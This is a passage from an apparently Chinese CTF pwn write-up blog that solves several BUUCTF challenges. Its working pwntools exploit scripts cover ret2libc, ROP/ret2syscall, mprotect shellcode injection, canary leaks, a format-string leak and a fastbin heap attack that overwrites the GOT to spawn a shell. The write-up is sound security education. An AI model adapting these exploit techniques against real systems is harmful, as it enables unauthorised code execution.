class="hljs-string">&#x27;printf&#x27;</span>,printf)<br>libc_base=printf-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>续：突然想去百度一下，看看那个给的后门函数是不是有用（因为我是没去用的，直接就是ret2libc了），结果发现，师傅们的解法是去利用已经给的函数，去让flag被打印出来，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27036</span>)<br><br>win_function1 = <span class="hljs-number">0x080485CB</span><br>win_function2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(win_function1)<br>payload += p32(win_function2) + p32(flag) + p32(<span class="hljs-number">0xBAAAAAAD</span>) + p32(<span class="hljs-number">0xDEADBAAD</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="三十四、picoctf-2018-buffer-overflow-1"><a href="#三十四、picoctf-2018-buffer-overflow-1" class="headerlink" title="三十四、picoctf_2018_buffer overflow 1"></a>三十四、picoctf_2018_buffer overflow 1</h3><p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25801</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+p32(<span class="hljs-number">0x80485cb</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;string: &quot;</span>,payload)<br>p.recvall()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十五、jarvisoj-test-your-memory"><a href="#三十五、jarvisoj-test-your-memory" class="headerlink" title="三十五、jarvisoj_test_your_memory"></a>三十五、jarvisoj_test_your_memory</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522154820.png"></p>
<p>checksec一下，然后进入ida</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522154920.png"></p>
<p>这题的溢出点在scanf，然后，这里的检查保护，似乎没什么用处，并不能影响到退栈时候，我们控制eip，所以不用管，然后后门函数给了，直接用就好了。</p>
<p>这题跟之前有道类似，这次我学聪明了，很早就nc看了，远程和本地不一样，远程先要我们进行输入，这里算是一个点；还有个就是，调用程序函数打印flag的时候，返回地址处要写存在的地址，不可以随便填写，否则无法得到flag。</p>
<img src="/2021/05/09/2021-05-09-buu05/QQ图片20210522155322.png" style="zoom:80%;">

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27280</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x080485BD</span><br>flag=<span class="hljs-number">0x80487e0</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x17</span>+p32(system)+p32(flag)+p32(flag)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十六、cmcc-simplerop"><a href="#三十六、cmcc-simplerop" class="headerlink" title="三十六、cmcc_simplerop"></a>三十六、cmcc_simplerop</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522172402.png"></p>
<p>checksec一下，然后拖进ida。</p>
<img src="/2021/05/09/2021-05-09-buu05/QQ图片20210522172444.png" style="zoom:80%;">

<p>符号表满满当当，静态链接了。一般考虑为ret2syscall。也确实，ROPgadget寻找了一番，syscall需要的都有了。除了没有/bin/sh，最开始我是直接寻找sh字符串的，因为有的题目sh也是可以getshell的，但是这题不行。就必须要找地方输入/bin/sh了，这个地方当然是.bss段啦</p>
<p>然后就是这边的溢出IDA里面有误，需要gdb里面进行寻找，偏移为32才对。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522162230.png"></p>
<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>int_80=<span class="hljs-number">0x0806EEF0</span><br>sh=<span class="hljs-number">0x080eafe1</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(pop_eax)+p32(<span class="hljs-number">0x3</span>)+p32(ppp_ret)+p32(<span class="hljs-number">8</span>)+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(int_80)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第一个写法，是我转后写的样子，但是我的不行，出现下面的报错打不通。去百度了，但是由于博客园审核，没能查看到博文</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522172906.png"></p>
<p>这边似乎是execve的条件未达成，可是我与上面的exp差别只在于int 80的地址不同，我的是ROPgadget中找到的，而上面exp里面的int 80，是我在一个师傅的wp里面发现的，两者不一样</p>
<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>int_80=<span class="hljs-number">0x080493e1</span><br>sh=<span class="hljs-number">0x080c1a9d</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二个方法其实本质原理与上一个一样，就是跳转read的构造方式不一样，这边直接使用地址跳转，而不是系统调用。注意这两个方法的int 80不一样，用第二的int 80调用两次就会出现上图的情况</p>
<p>exp3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level =<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>bss=<span class="hljs-number">0x080eaf80</span><br>mprotect=elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(mprotect)+p32(ppp_ret)+p32(<span class="hljs-number">0x80ea000</span>)+p32(<span class="hljs-number">0x2000</span>)+p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x50</span>)+p32(bss)<br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第三个方法是使用mprotect把.bss修改为可执行，然后注入shellcode来getshell，有个点是修改的起始位置，得要最后三个为0才行，否则打不通，像是内存对齐的问题。</p>
<h3 id="三十七、mrctf2020-shellcode"><a href="#三十七、mrctf2020-shellcode" class="headerlink" title="三十七、mrctf2020_shellcode"></a>三十七、mrctf2020_shellcode</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522191716.png"></p>
<p>checksec一下，预测是注入shellcode，然后拖进IDA。</p>
<img src="/2021/05/09/2021-05-09-buu05/QQ图片20210522191817.png" style="zoom:80%;">

<p>这题出没办法反汇编，百度上的wp也没办法，可能是直接call rax有点问题。不过好在汇编不复杂，很简单的程序逻辑，先输入0x400，然后做一个判断，其实这个判断无影响的，有输入的话，rax返回值就是大于0，跳转到右侧去执行，右侧是直接执行我们输入的数据，所以这边是直接ret2shellcode</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27104</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;magic!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十八、others-babystack"><a href="#三十八、others-babystack" class="headerlink" title="三十八、others_babystack"></a>三十八、others_babystack</h3><p>这题代码很简单，canary也很容易泄露，其他就是rop。所以不多说。</p>
<p>注意点就是，这里的退栈要执行功能3才能退出，我刚开始一直反应过来，后面才发现的。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27939</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=<span class="hljs-number">0x400908</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400a93</span><br><span class="hljs-comment">#泄漏canary</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>)<br>canary=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;canary: &quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>puts=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十九、-ZJCTF-2019-EasyHeap"><a href="#三十九、-ZJCTF-2019-EasyHeap" class="headerlink" title="三十九、[ZJCTF 2019]EasyHeap"></a>三十九、[ZJCTF 2019]EasyHeap</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525230925.png"></p>
<p>checksec一下， 然后进入ida。根据题目已经知道是个heap题目。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231121.png"></p>
<p>这边在编辑chunk上内容时候，输入的大小是再次由我们确定的，所以这里有着堆溢出漏洞，可以修改后一个chunk的fd指针，导致任意写的目的。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231025.png"></p>
<p>这边释放已经把指针置空了。</p>
<p>生成chunk就没什么好说的，然后这里是没有打印函数的，如果要输出就比较麻烦，要用IO结构体输出了。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231313.png"></p>
<p>这边其实有个后门函数的，可能是原题的有，但是这是buu，做到这大家应该都知道，flag就是直接在/根目录下的，所以不用去尝试就知道这里不行，但是给了system函数，got又可以改写，这边就使用修改got表的方法。具体脚本写，exp的注释十分详细了，步骤也不复杂，就不赘述了。</p>
<p>具体脚本编写，我在百度里面找到了一个师傅写的很详细，就直接搬过来了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26437</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020e0</span>-<span class="hljs-number">0x40</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br><span class="hljs-comment"># 修改 heap1 内容为 &#x27;/bin/sh\x00&#x27;, 以及堆溢出 heap2(freed) 修改其 fd 指针 </span><br><span class="hljs-comment"># 因为最后释放的是 heap1,利用 &#x27;__free_hook&#x27;(system) Getshell </span><br><span class="hljs-comment"># 为什么是 0x6020e0-0x40+0xd，这个偏移就是去寻找7f的固定手法，只是改变-后面的去找符合条件的就是了</span><br><span class="hljs-comment"># FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f</span><br><span class="hljs-comment"># 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)</span><br><span class="hljs-comment"># 这样就伪造出了一个 chunk</span><br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(free_got)<br>edit(<span class="hljs-number">3</span>,payload)<br><span class="hljs-comment"># 修改 heap3 (Fake)</span><br><span class="hljs-comment"># 作用是把 heaparray[0] 的地址 (原先记录的是 chunk0的地址) 覆写成 free_got 地址</span><br><span class="hljs-comment"># 这就是要在 heaparry 附近构造 Fakeheap 的原因</span><br><span class="hljs-comment"># 确定具体的偏移量需要动态调试 </span><br>edit(<span class="hljs-number">0</span>,p64(system))<br><span class="hljs-comment"># free_got 地址的作用在这里体现了</span><br><span class="hljs-comment"># 由于 edit() 的目标是 heaparry[] 里面的地址</span><br><span class="hljs-comment"># 那么本次操作将修改 free_got 为 system_plt 的地址</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 当释放 chunk1 (内容为 &#x27;/bin/sh\0x00&#x27;) 的时候</span><br><span class="hljs-comment"># 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()</span><br><span class="hljs-comment"># 最后程序执行的就是 system(chunk1&#x27;s content) 即 system(&#x27;/bin/sh\0x00&#x27;), 成功 Getshell</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二个我自己写的没能打通，看报错像是检验大小没过，可是我之前做过一道题，这样子也是可以创建堆块的，我是想把chunk直接创建在free的got.plt里面，直接改就好了，没必要像上面绕一圈子，没想过不行。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210527152159.png"></p>
<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,28313)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=<span class="hljs-number">0x602018</span><br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(free_got-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十、bjdctf-2020-babyrop2"><a href="#四十、bjdctf-2020-babyrop2" class="headerlink" title="四十、bjdctf_2020_babyrop2"></a>四十、bjdctf_2020_babyrop2</h3><p>checksec一下</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100246.png"></p>
<p>开启了NX和Canary</p>
<p>进入ida看看代码</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100325.png"></p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100334.png"></p>
<p>一个函数里面有着格式化字符串漏洞，允许我们输入六个长度的数据，用来泄露canary的，然后在后面的函数里面存在栈溢出，泄露libc的以及getshell的。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529092432.png"></p>
<p>AAAAAA是我输进去的内容，他的位置在栈顶处，是格式化字符串的第六个参数，可以看见，在其下面的就是我们要的canary了，所以是第七个参数，从而确定构造为”%7$p”，之后就是正常的普通rop内容了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400993</span><br>main=<span class="hljs-number">0x400887</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;%7$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;u!&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.recv()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu04</title>
    <url>/2021/05/05/2021-05-05-buu04/</url>
    <content><![CDATA[<p>以下几题的ciscn是我先抽出来做的，因为这几周在进行iscc，以及不久就是ciscn，所以看看之前的题目，就先不按顺序</p>
